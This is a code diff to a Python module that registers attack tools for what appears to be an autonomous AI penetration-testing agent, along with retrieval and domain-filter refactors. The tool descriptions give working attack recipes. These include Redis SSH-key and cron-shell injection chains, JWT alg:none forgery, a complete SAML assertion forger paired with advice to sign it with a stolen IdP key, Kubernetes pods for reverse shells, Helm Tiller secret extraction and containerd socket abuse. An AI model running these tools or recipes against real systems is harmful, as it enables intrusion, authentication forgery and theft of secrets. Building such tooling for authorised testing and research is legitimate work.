@@ -1056,9 +1056,15 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=120,
     )
 
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="ssh_exec",
-        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {username}@{host} '{command}' 2>&1",
+        shell_args=[
+            "sshpass", "-p", "{password}", "ssh",
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "ConnectTimeout=10",
+            "-p", "{port}", "{username}@{host}", "{command}",
+        ],
+        split_params=["command"],
         description="Execute a command on a remote host via SSH (requires username + password). Use for Linux privilege escalation checks (sudo -l, uname -a, id), file listing, flag hunting, and post-exploitation.",
         parameters={
             "host": {"type": "string", "description": "SSH target hostname or IP"},
@@ -1082,10 +1088,18 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=60,
     )
 
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="ssh_key_exec",
-        command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o PasswordAuthentication=no -o BatchMode=yes -p {port} -i {key_path} {user}@{host} '{command}' 2>&1",
-        description="Execute a command on a remote host using SSH key authentication (no password needed). Always specify port — default SSH port is 22, but many targets use non-standard ports.",
+        shell_args=[
+            "ssh",
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "ConnectTimeout=10",
+            "-o", "PasswordAuthentication=no",
+            "-o", "BatchMode=yes",
+            "-p", "{port}", "-i", "{key_path}", "{user}@{host}", "{command}",
+        ],
+        split_params=["command"],
+        description="Execute a command on a remote host using SSH key authentication (no password needed). Always specify port - default SSH port is 22, but many targets use non-standard ports.",
         parameters={
             "key_path": {"type": "string", "description": "Path to SSH private key file", "default": "~/.ssh/id_rsa"},
             "user": {"type": "string", "description": "SSH username", "default": "root"},
@@ -1266,8 +1280,10 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         try:
             from darwin.rag import get_rag
             rag = get_rag()
-            # Always search WITHOUT category filter first
-            results = rag.search(query, top_k=5, category="", min_keyword_overlap=0.2)
+            # Phase 2: two-stage retrieval first (routes to the taxonomy
+            # subtree, then ranks inside it); falls back to flat search when
+            # the taxonomy is unavailable or no leaf routes.
+            results = rag.search_hierarchical(query, top_k=5, min_keyword_overlap=0.2)
             # Only apply category filter if first pass is too noisy
             if len(results) > 10 and category:
                 results = rag.search(query, top_k=5, category=category, min_keyword_overlap=0.2)
@@ -1298,7 +1314,10 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
             output = "## Knowledge Base\n\n"
             for i, r in enumerate(results, 1):
-                output += f"### {i}. {r['title']} (score:{r['score']:.3f}, {r.get('collection','')}/{r['category']})\n"
+                path = r.get("path") or []
+                path_str = "/".join(path) if path else f"{r.get('collection','')}/{r['category']}"
+                guid = r.get("guid") or ""
+                output += f"### {i}. {r['title']} (score:{r['score']:.3f}, {path_str}{' ' + guid if guid else ''})\n"
                 output += f"{r['description']}\n"
                 if r.get('techniques'):
                     output += "**Techniques:**\n"
@@ -1549,10 +1568,11 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="redis_cmd",
-        command_template="redis-cli -h {host} -p {port} {command} 2>&1",
-        description="Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: redis_cmd(host,port,'CONFIG SET dir /root/.ssh') → redis_cmd(host,port,'CONFIG SET dbfilename authorized_keys') → redis_cmd(host,port,'SET key \"\\n\\nssh-rsa AA...\"') → redis_cmd(host,port,'SAVE'). Cron shell: CONFIG SET dir /var/spool/cron/crontabs → CONFIG SET dbfilename root → SET key 'cmd' → SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
+        shell_args=["redis-cli", "-h", "{host}", "-p", "{port}", "{command}"],
+        split_params=["command"],
+        description="Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: CONFIG SET dir /root/.ssh -> CONFIG SET dbfilename authorized_keys -> SET key <public key> -> SAVE. Cron shell variant: CONFIG SET dir /var/spool/cron/crontabs -> CONFIG SET dbfilename root -> SET key <cmd> -> SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
         parameters={
             "host": {"type": "string", "description": "Redis host IP or hostname"},
             "port": {"type": "integer", "description": "Redis port (default 6379)"},
@@ -1832,7 +1852,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         description="Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).",
         parameters={
             "secret": {"type": "string", "description": "JWT signing secret or key"},
-            "algorithm": {"type": "string", "description": "JWT algorithm (HS256, HS384, HS512, RS256). Default HS256.", "default": "HS256"},
+            "algorithm": {"type": "string", "description": "JWT algorithm: HS256, HS384, HS512, RS256, or 'none' (unsigned alg:none attack). Default HS256.", "default": "HS256"},
             "claims_b64": {"type": "string", "description": "Base64-encoded JSON claims payload"},
             "claims": {"type": "string", "description": "Alias for claims_b64 — base64-encoded JSON claims"},
         },
@@ -1845,7 +1865,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register_shell_tool(
         name="saml_forge",
         command_template="python3 -c \"import base64,zlib; from xml.etree.ElementTree import Element,SubElement,register_namespace,tostring; from datetime import datetime,timedelta,timezone; NS={'saml':'urn:oasis:names:tc:SAML:2.0:assertion','samlp':'urn:oasis:names:tc:SAML:2.0:protocol','ds':'http://www.w3.org/2000/09/xmldsig#'}; register_namespace('saml',NS['saml']); register_namespace('samlp',NS['samlp']); register_namespace('ds',NS['ds']); now=datetime.now(timezone.utc); ae=Element('{{{saml}}}Assertion'.format(**NS),{{'ID':'_{id}','Version':'2.0','IssueInstant':now.isoformat(),'xmlns:saml':NS['saml']}}); iss=SubElement(ae,'{{{saml}}}Issuer'.format(**NS)); iss.text='{issuer}'; subj=SubElement(ae,'{{{saml}}}Subject'.format(**NS)); nid=SubElement(subj,'{{{saml}}}NameID'.format(**NS),{{'Format':'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'}}); nid.text='{name_id}'; sc=SubElement(subj,'{{{saml}}}SubjectConfirmation'.format(**NS),{{'Method':'urn:oasis:names:tc:SAML:2.0:cm:bearer'}}); scd=SubElement(sc,'{{{saml}}}SubjectConfirmationData'.format(**NS),{{'NotOnOrAfter':(now+timedelta(hours=1)).isoformat(),'Recipient':'{recipient}'}}); cond=SubElement(ae,'{{{saml}}}Conditions'.format(**NS),{{'NotBefore':now.isoformat(),'NotOnOrAfter':(now+timedelta(hours=1)).isoformat()}}); ar=SubElement(cond,'{{{saml}}}AudienceRestriction'.format(**NS)); aud=SubElement(ar,'{{{saml}}}Audience'.format(**NS)); aud.text='{audience}'; as_el=SubElement(ae,'{{{saml}}}AttributeStatement'.format(**NS)); attr=SubElement(as_el,'{{{saml}}}Attribute'.format(**NS),{{'Name':'{attr_name}'}}); av=SubElement(attr,'{{{saml}}}AttributeValue'.format(**NS)); av.text='{attr_value}'; xml_decl='<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>'; raw=xml_decl+tostring(ae,encoding='unicode'); print(base64.b64encode(raw.encode()).decode())\" 2>&1",
-        description="Forge a SAML 2.0 assertion for cloud federation attacks (AWS AssumeRoleWithSAML, GCP workload identity federation, Azure AD SAML). Constructs a minimal SAML assertion XML with the specified attributes and base64-encodes it for use with aws_iam_federation or aws sts assume-role-with-saml. Use when you have stolen a private key but need a properly formatted SAML assertion.",
+        description="Forge a SAML 2.0 assertion for cloud federation attacks (AWS AssumeRoleWithSAML, GCP workload identity federation, Azure AD SAML). Constructs a minimal SAML assertion XML with the specified attributes and base64-encodes it for use with aws_iam_federation or aws sts assume-role-with-saml. Use when you have stolen a private key but need a properly formatted SAML assertion. NOTE: the generated assertion is UNSIGNED - for signature-verifying services, sign it with the stolen IdP private key before submission.",
         parameters={
             "id": {"type": "string", "description": "Unique assertion ID (e.g. '_abc123')", "default": "_saml-assertion-001"},
             "issuer": {"type": "string", "description": "SAML IdP entity ID / issuer (e.g. 'http://idp.example.com/metadata')"},
@@ -3720,9 +3740,13 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="kubectl_run",
-        command_template="kubectl run {name} --image={image} --restart=Never -n {namespace} --command -- {command} 2>&1",
+        shell_args=[
+            "kubectl", "run", "{name}", "--image={image}", "--restart=Never",
+            "-n", "{namespace}", "--command", "--", "{command}",
+        ],
+        split_params=["command"],
         description="Create and run a pod in Kubernetes. Use for deploying test containers, privilege escalation pods, or reverse shells. Requires namespace creation permissions.",
         parameters={
             "name": {"type": "string", "description": "Pod name (e.g. 'test-pod')"},
@@ -3803,9 +3827,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="kubectl_exec",
-        command_template="kubectl exec {pod} -n {namespace} -- {command} 2>&1",
+        shell_args=[
+            "kubectl", "exec", "{pod}", "-n", "{namespace}", "--", "{command}",
+        ],
+        split_params=["command"],
         description="Execute a command inside a running Kubernetes pod. Use for post-exploitation after gaining pod access.",
         parameters={
             "pod": {"type": "string", "description": "Pod name"},
@@ -3827,10 +3854,11 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=120,
     )
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="helm",
-        command_template="helm {command} 2>&1",
-        description="Execute a Helm command. For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) — use --host for connecting to Tiller directly.",
+        shell_args=["helm", "{command}"],
+        split_params=["command"],
+        description="Execute a Helm command. For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) - use --host for connecting to Tiller directly.",
         parameters={
             "command": {"type": "string", "description": "Full helm command. For Tiller: '--host <svc>.<ns>:44134 ls --all'"},
         },
@@ -4279,10 +4307,14 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     # ── CRI Runtime Interaction ─────────────────────────────────
     # crictl for containerd/CRI-O socket attacks (K8S-16).
 
-    gateway.register_shell_tool(
+    gateway.register_shell_argv_tool(
         name="crictl_cmd",
-        command_template="crictl --runtime-endpoint {endpoint} {action} {args} 2>&1 | head -200",
-        description="Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks — when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).",
+        shell_args=[
+            "crictl", "--runtime-endpoint", "{endpoint}",
+            "{action}", "{args}",
+        ],
+        split_params=["action", "args"],
+        description="Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks - when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).",
         parameters={
             "endpoint": {"type": "string", "description": "CRI socket path (e.g. 'unix:///run/containerd/containerd.sock')", "default": "unix:///run/containerd/containerd.sock"},
             "action": {"type": "string", "description": "CRI action: pods, ps, inspect, exec, images, pull"},
@@ -5004,7 +5036,10 @@ def _apply_domain_filter(gateway: MCPGateway, enabled_domains: set[str] | None) 
     """Remove tools whose domain is not in enabled_domains.
 
     If enabled_domains is None (default), no filtering is applied.
-    Tools not in _DOMAIN_TOOL_MAP are always kept.
+    Phase 1: filtering is data-driven — tools with a ToolSpec that
+    declares domains are removed when none of those domains are enabled.
+    _DOMAIN_TOOL_MAP remains as a fallback for tools that predate spec
+    domains.
     """
     if enabled_domains is None:
         return
@@ -5022,6 +5057,25 @@ def _apply_domain_filter(gateway: MCPGateway, enabled_domains: set[str] | None) 
             if removed:
                 _log.info("Domain '%s' disabled: removed %d tools: %s",
                           domain, len(removed), ", ".join(sorted(removed)))
+
+    # Data-driven pass: ToolSpec/entry domains.
+    specs = gateway.get_tool_specs()
+    removed_spec = []
+    for tool_name, entry in list(gateway._registry.items()):
+        spec = specs.get(tool_name)
+        domains = []
+        if spec is not None and spec.domains:
+            domains = list(spec.domains)
+        elif entry.domain:
+            domains = [entry.domain]
+        if not domains:
+            continue
+        if not (set(domains) & enabled_domains):
+            del gateway._registry[tool_name]
+            removed_spec.append(f"{tool_name}({','.join(domains)})")
+    if removed_spec:
+        _log.info("Spec domain filter removed %d tools: %s",
+                  len(removed_spec), ", ".join(sorted(removed_spec)))
 
 
 def create_attack_gateway() -> MCPGateway:
@@ -5049,4 +5103,5 @@ def create_attack_gateway() -> MCPGateway:
         pass
 
     _apply_domain_filter(gateway, _enabled_domains)
+    gateway.ensure_specs()
     return gateway
